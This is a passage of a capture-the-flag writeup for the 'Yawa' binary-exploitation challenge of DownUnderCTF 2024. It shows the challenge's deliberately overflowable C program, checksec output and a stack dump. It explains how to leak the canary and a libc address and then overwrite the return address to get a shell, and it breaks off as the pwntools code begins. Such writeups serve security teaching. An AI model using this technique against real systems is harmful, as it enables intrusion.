
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Writeup for challenge "Yawa" of Down Under CTF 2024">
      
      
      
      
        <link rel="prev" href="../decrypt_eval/">
      
      
        <link rel="next" href="../dna/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.13">
    
    
      
        <title>Yawa writeup - DU CTF 2024</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e359304.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#prologue" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="DU CTF 2024" class="md-header__button md-logo" aria-label="DU CTF 2024" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            DU CTF 2024
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Yawa writeup
            
          </span>
        </div>
      </div>
    </div>
    
    
    
    
    
      <div class="md-header__source">
        <a href="https://github.com/sukolenvo/2024duCTF" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="DU CTF 2024" class="md-nav__button md-logo" aria-label="DU CTF 2024" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    DU CTF 2024
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/sukolenvo/2024duCTF" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DownUnderCTF 2024 Writeups
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../shufflebox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shufflebox
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../number_mashing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Number mashing
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../transmissions/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Intercepted transmissions
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../vector/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vector overflow
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../decrypt_eval/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Decrypt then eval
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Yawa
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Yawa
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#prologue" class="md-nav__link">
    <span class="md-ellipsis">
      Prologue
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#my-struggle" class="md-nav__link">
    <span class="md-ellipsis">
      My struggle
    </span>
  </a>
  
    <nav class="md-nav" aria-label="My struggle">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leak-canary-value" class="md-nav__link">
    <span class="md-ellipsis">
      Leak canary value
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leak-libc-address" class="md-nav__link">
    <span class="md-ellipsis">
      Leak libc address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Remote shell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#epilogue" class="md-nav__link">
    <span class="md-ellipsis">
      Epilogue
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../dna/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNAdecay
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../sssshhhh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sssshhhh
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#prologue" class="md-nav__link">
    <span class="md-ellipsis">
      Prologue
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#my-struggle" class="md-nav__link">
    <span class="md-ellipsis">
      My struggle
    </span>
  </a>
  
    <nav class="md-nav" aria-label="My struggle">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leak-canary-value" class="md-nav__link">
    <span class="md-ellipsis">
      Leak canary value
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leak-libc-address" class="md-nav__link">
    <span class="md-ellipsis">
      Leak libc address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Remote shell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#epilogue" class="md-nav__link">
    <span class="md-ellipsis">
      Epilogue
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
    <a href="https://github.com/sukolenvo/2024duCTF/edit/master/docs/yawa/index.md" title="Edit this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg>
    </a>
  
  


  <h1>Yawa</h1>

<h2 id="prologue">Prologue<a class="headerlink" href="#prologue" title="Permanent link">&para;</a></h2>
<p>Difficulty: beginner</p>
<p>Category: binary exploitation</p>
<p>Solved: 184</p>
<div class="admonition quote">
<p class="admonition-title">Description</p>
<p>Yet another welcome application.</p>
</div>
<p>Input files:</p>
<details class="info">
<summary>yawa.c</summary>
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">menu</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;1. Tell me your name&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;2. Get a personalised greeting&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">init</span><span class="p">();</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">88</span><span class="p">];</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>

<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">menu</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="mh">0x88</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
</details>
<ul>
<li><a href="https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/beginner/yawa/src/yawa">yawa binary</a></li>
<li><a href="https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/beginner/yawa/src/libc.so.6">libc.so.6</a></li>
<li><a href="https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/beginner/yawa/src/ld-linux-x86-64.so.2">ld-linux-x86-64.so.2</a></li>
</ul>
<p>NB:</p>
<ul>
<li>
<p>Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by <strong>number</strong>, 0-based index implied. </p>
<p>Ie, element <code>0</code> of list <code>[1, 2, 4, 8, 16]</code> is <code>1</code>, Element <code>3</code> is <code>8</code>.</p>
<p>When element is reference in explanation with <strong>word</strong> (first, third...), 1-based system is implied.</p>
<p>Ie, first character of string <code>Hello World!</code> is <code>H</code>, fifth is <code>o</code>.</p>
</li>
</ul>
<ul>
<li>Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure.</li>
</ul>
<ul>
<li>I am using gdb with <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> plugin</li>
</ul>
<h2 id="my-struggle">My struggle<a class="headerlink" href="#my-struggle" title="Permanent link">&para;</a></h2>
<p>Task includes binary(with libc library and ld linker to run it) and source code. First thing I review source code to build a plan.
There is no <code>win()</code> function or equivalent so we likely have to get <abbr title="Remote Code Execution">RCE</abbr> (shell or similar). Source code is so short that it don't
take long to find a bug in code that we can exploit:</p>
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">88</span><span class="p">];</span><span class="w">                 </span><span class="err">#</span><span class="w"> </span><span class="n">desclare</span><span class="w"> </span><span class="n">variable</span><span class="w"> </span><span class="n">name</span>
<span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>

<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">menu</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="mh">0x88</span><span class="p">);</span><span class="w">  </span><span class="err">#</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">variable</span><span class="w"> </span><span class="n">name</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>Variable <code>name</code> is a buffer of 88 characters, but <code>read(0, name 0x88)</code> reads up to 0x88 = 136 characters. Means we can overflow
stack and get code execution.</p>
<p>Now that we know what to do lets check what type of binary we have and what types of protection are enabled:</p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>yawa<span class="w">  </span>
yawa:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>pie<span class="w"> </span>executable,
<span class="w">  </span>x86-64,<span class="w">                                </span><span class="c1"># 64-bit</span>
<span class="w">  </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,
<span class="w">  </span>dynamically<span class="w"> </span>linked,
<span class="w">  </span>interpreter<span class="w"> </span>./ld-linux-x86-64.so.2,
<span class="w">  </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">3</span>.2.0,
<span class="w">  </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>7f7b72aaab967245353b6816808804a6c4ad2168,
<span class="w">  </span>not<span class="w"> </span>stripped

$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>yawa<span class="w">        </span>
RELRO<span class="w">           </span>STACK<span class="w"> </span>CANARY<span class="w">      </span>NX<span class="w">            </span>PIE<span class="w">             </span>RPATH<span class="w">      </span>RUNPATH<span class="w">      </span>Symbols<span class="w">         </span>FORTIFY<span class="w"> </span>Fortified<span class="w">       </span>Fortifiable<span class="w">     </span>FILE
Full<span class="w"> </span>RELRO<span class="w">      </span>Canary<span class="w"> </span>found<span class="w">      </span>NX<span class="w"> </span>enabled<span class="w">    </span>PIE<span class="w"> </span>enabled<span class="w">     </span>No<span class="w"> </span>RPATH<span class="w">   </span>RW-RUNPATH<span class="w">   </span><span class="m">45</span><span class="w"> </span>Symbols<span class="w">        </span>No<span class="w">    </span><span class="m">0</span><span class="w">               </span><span class="m">2</span><span class="w">               </span>yawa
</code></pre></div></td></tr></table></div>
<p>So, we have full package:</p>
<ul>
<li>Canary stack protection - stack is protected from overwrites;</li>
<li>NX enabled - stack is not executable;</li>
<li><abbr title="Postiion Independent Executable">PIE</abbr> enabled - every time you run the file it gets loaded into a different memory address.</li>
</ul>
<p>If you are not familiar with any of above techniques and would like to learn about them (I am going to briefly touch them, but
there is goal to include in-detail explanation of each of the techniques in this writeup) I recommend reading following 
gitbook notes: <a href="https://ir0nstone.gitbook.io/notes">https://ir0nstone.gitbook.io/notes</a>. This is by a long shot the best resource I have seen on internet on the topic
both quality of explanation and completeness of content is superb.</p>
<p>Next I use <a href="https://github.com/io12/pwninit">pwninit</a> to be able to run binary on my machine without need to juggle with environment variable paths etc:
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>pwninit<span class="w"> </span>--bin<span class="w"> </span>yawa<span class="w"> </span>--libc<span class="w"> </span>./libc.so.6
</code></pre></div></td></tr></table></div></p>
<p>Exploit algorithm:</p>
<ol>
<li>Leak canary value from stack to bypass canary protection;</li>
<li>Leak libc address to find <a href="https://man7.org/linux/man-pages/man3/system.3.html">system</a> call;</li>
<li>Use buffer overflow to get remote shell and obtain flag.</li>
</ol>
<p>Here is sample memory layout of stack that we will be working with:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Memory layout</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code>0x7fffffffdc60: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc68: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc70: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc78: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc80: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc88: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc90: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc98: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdca0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdca8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdcb0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdcb8: 0x00    0x87    0x60    0x15    0x3c    0x9c    0x6f    0x4b
0x7fffffffdcc0: 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdcc8: 0x90    0x9d    0xc2    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffdcd0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
</code></pre></div></td></tr></table></div>
<p>Variable name is stored at address 0x7fffffffdc60 (line 1).</p>
<p>Canary value is stored at address 0x7fffffffdcb8 (line 12), it always ends with 0x00 on linux (remember - its little endian). Therefore, its 
value is 0x4b6f9c3c15608700.</p>
<p>At address 0x7fffffffdcb8 we see some 8byte long number 1 (not sure what it is - I've left it untouched in my work).</p>
<p>At address 0x7fffffffdcc8 (line 14) we see return address from the main function (0x00007ffff7c29d90), here we want to place jump to system call.</p>
<h3 id="leak-canary-value">Leak canary value<a class="headerlink" href="#leak-canary-value" title="Permanent link">&para;</a></h3>
<p>Canary protection (read more <a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">here</a>) puts a random value on stack
before execution and checks if hasn't been modified while function was running (if it is - program exits).</p>
<p>If we want overwrite return address at 0x7fffffffdcc8, by overflowing variable <code>name</code> at 0x7fffffffdc60,
we will have overwrite canary address at 0x7fffffffdcb8 as we can only write continues block of memory. 
Therefore, we will have to leak canary value from stack and when we overflow buffer put exactly same bytes in the same place
to prevent canary protection from triggering.</p>
<p>To leak address we can take advantage of "print your name functionality":</p>
<p><div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">     </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<code>%s</code> modifier of <code>printf</code> prints all bytes starting from address <code>name</code> until it reaches nullbyte. So if we put 'a' from
0x7fffffffdc60 till 0x7fffffffdcb8, it is going to print <code>aaaaa...</code> and won't stop just on 'a' (as there is no
nullbyte) it will continue printing up until 0x7fffffffdcc0 (including entire canary value) and then stop:</p>
<div class="language-py highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">leak canary block</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># &#39;io&#39; is pwntools input/output pipe object that connected to process or remote server</span>

<span class="k">def</span> <span class="nf">get_canary_value</span><span class="p">():</span>
